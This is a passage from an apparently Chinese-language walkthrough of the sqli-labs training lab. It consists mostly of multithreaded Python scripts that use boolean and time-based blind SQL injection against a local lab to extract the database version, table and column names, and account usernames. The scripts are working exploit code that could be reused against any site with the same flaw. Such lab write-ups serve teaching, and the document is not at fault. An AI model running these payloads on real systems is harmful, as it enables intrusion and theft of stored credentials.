function_">send_data</span>(<span class="params">dic</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;</span>+dic[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> rest.text:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="string">&quot;search&quot;</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311756271.png" alt="image-20220531175643219"></p><p><strong>数据库版本</strong>：</p><p>5.7.2.6</p><p>python，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(1,15):</span><br><span class="line">            payload = &quot;&#x27; and substr(version(),%d,1)=%d--+ &quot;  %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:j,&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line">            j = j + 1</span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311757287.png" alt="image-20220531175737242"></p><p><strong>测表名：python</strong></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205312223322.png" alt="image-20220531222327234"> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,10):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27; --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    global page_1</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_1 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>测字段名</strong>：在测表的payload稍微改一下就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,10):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema = database() limit %d,1),%d,1)=&#x27;%c&#x27; --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    global page_1</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_1 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205312246163.png" alt="image-20220531224616079"></p><p>爆账号密码：</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206011425561.png" alt="image-20220601142506421"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">        for z in range(1,94):</span><br><span class="line">            for j in range(43,90):</span><br><span class="line">                payload = &quot;&#x27; and substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27; --+ &quot; % (z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: z&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    if &quot;You are in&quot; in rest.text:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>爆密码的话改参数就行</p><h4 id="Less-9-10"><a href="#Less-9-10" class="headerlink" title="Less-9-10"></a><strong>Less-9</strong>-10</h4><p>\在这关不显示了，这边直接用python，原本以为基于时间的延时注入会没用效果，没想到还是能检测出来。并且验证后发现闭合符是对的</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021436598.png" alt="image-20220602143630536"></p><p>这边时间注入，成功验证了执行，sleep函数，也就是if语句为真。那么接下来开始利用python写exp</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021455796.png" alt="image-20220602145559733"></p><h5 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206030036528.png" alt="image-20220603003659464"></p><p>这里的闭合符为”</p><p>接下来就以第九关为例</p><p>“ and if(substr(database(),1,1)&#x3D;’s’,sleep(3),0) # </p><p><strong>爆数据库：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(91,127):</span><br><span class="line">            payload = &quot;&#x27; and if(substr(database(),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+ &quot; %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:chr(j),&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021449857.png" alt="image-20220602144914797"></p><p><strong>爆出数据库版本：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1,15):</span><br><span class="line">        for j in range(1,15):</span><br><span class="line">            payload = &quot;&#x27; and if(substr(version(),%d,1)=&#x27;%d&#x27;,sleep(3),0) --+ &quot; %(i,j)</span><br><span class="line">            dic = &#123;&quot;search&quot;:j,&quot;payload&quot;:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021458124.png" alt="image-20220602145834061"></p><p><strong>爆出表名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(1):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+&quot; % (i, z, j)</span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    global page_2</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_2:</span><br><span class="line">        page_2 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这个python是我用单线程跑的，不知道为啥多线程会有并发实现的冲突</p><p>后续又进行研究，发现把表名爆出后，后面多余的传入+号，if语句也会为真，这里也正好做表名的分隔符用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;uname=admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0) %() # &amp;passwd=adm&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022212452.png" alt="image-20220602221227390"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line">from threading import Lock</span><br><span class="line">lock = Lock()</span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(38,91):</span><br><span class="line">                lock.acquire()</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0) --+&quot; % (i, z, j)</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    global page_2</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>爆字段名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line">from threading import Lock</span><br><span class="line">lock = Lock()</span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">    global page_2</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for z in range(1,15):</span><br><span class="line">            for j in range(91,127):</span><br><span class="line">                lock.acquire()</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0) --+&quot; % (i, z, j)</span><br><span class="line">                if i &gt; page_2:</span><br><span class="line">                    page_2 = i</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: &#x27;,&#x27;&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line"></span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if dic[&quot;page&quot;] == &#x27;,&#x27;:</span><br><span class="line">        print()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    page_2 = 0</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022234592.png" alt="image-20220602223456529"></p><p><strong>爆破账号密码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    